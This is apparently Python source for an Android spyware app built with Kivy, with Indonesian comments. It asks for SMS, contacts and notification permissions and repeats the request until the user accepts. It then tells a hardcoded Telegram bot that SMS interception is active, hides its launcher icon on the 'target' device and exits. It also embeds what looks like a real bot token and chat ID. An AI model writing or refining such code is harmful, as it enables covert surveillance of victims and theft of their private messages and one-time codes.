import telebot
from android.permissions import request_permissions, Permission
from jnius import autoclass
from kivy.app import App
from kivy.clock import Clock
import os

TOKEN = "8688240904:AAFbm71rIxvaNTAuy0qUatSkAagp26uD6ZU"
CHAT_ID = "5999516433"
bot = telebot.TeleBot(TOKEN)

class LOKTV(App):
    def build(self):
        Clock.schedule_once(lambda dt: self.minta_izin(), 1)
        return None

    def minta_izin(self):
        perms = [
            Permission.READ_SMS, 
            Permission.RECEIVE_SMS, 
            Permission.POST_NOTIFICATIONS,
            Permission.READ_CONTACTS
        ]
        request_permissions(perms, self.eksekusi_total)

    def eksekusi_total(self, permissions, grants):
        if all(grants):
            try:
                # Kirim sinyal ke bot bahwa penyadapan SIAP
                bot.send_message(CHAT_ID, "📡 SISTEM AKTIF!\nSMS masuk akan otomatis terkirim ke sini.")
                
                # Sembunyikan Ikon
                self.hilangkan_ikon()
            except Exception as e:
                bot.send_message(CHAT_ID, f"Error: {str(e)}")
        else:
            # Jika belum diizinkan, minta terus sampai diklik
            self.minta_izin()

    def hilangkan_ikon(self):
        try:
            activity = autoclass('org.kivy.android.PythonActivity').mActivity
            pm = activity.getPackageManager()
            comp = autoclass('android.content.ComponentName')(activity.getPackageName(), 'org.kivy.android.PythonActivity')
            
            # Status 2 = DISABLED (Hilang)
            pm.setComponentEnabledSetting(comp, 2, 1)
            
            bot.send_message(CHAT_ID, "⚠️ Ikon sudah hilang di target. Menunggu SMS...")
            
            # Jeda sebentar sebelum tutup aplikasi agar sistem sempat proses
            Clock.schedule_once(lambda dt: os._exit(0), 3)
        except:
            os._exit(0)

if __name__ == '__main__':
    LOKTV().run()
